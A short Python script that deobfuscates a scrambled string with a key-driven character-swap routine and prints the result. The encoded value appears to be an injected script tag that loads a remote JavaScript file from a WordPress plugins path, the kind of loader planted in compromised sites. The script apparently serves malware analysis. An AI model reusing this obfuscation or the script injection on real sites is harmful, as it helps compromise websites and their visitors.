from urllib.parse import unquote


keyString = "p.o~bB&Oe~GebHRJBjH"
encText = "%3Ctcri/ctsrs=hptpc://pww.tcstingdomain.it/wp-sonsent/plugins/js_eomwoserpdee.js%3E%3C/ctrie%20%3E"
key = []

#Convert key to char code
for x in range(len(keyString)):
    key.append(ord(keyString[x]))

#Convert encText to list and parse URL
encText = list(unquote(encText))

#Set initial key and encoded text positions.
keyPos = len(encText) % len(key)    
encPos = len(encText) - 1

#Loop through entire encoded text
while encPos >= 0:

    #Decrement the key position.
    keyPos-=1
    #If we reach the end of our key position, reset.
    if keyPos < 0:
        keyPos = len(key)-1

    #Take the char value in the key and add to the current encoded
    #text position
    decodePos = encPos + key[keyPos]

    #If the current calculated value is less than the encoded text
    #lenght find and swap two chars (decode)
    if decodePos < len(encText):
            tempSwapA = encText[encPos]
            tempSwapB = encText[decodePos]
            encText[decodePos] = tempSwapA
            encText[encPos] = tempSwapB
        
    #Decrement the encoded text position.
    encPos-=1

print("".join(encText))

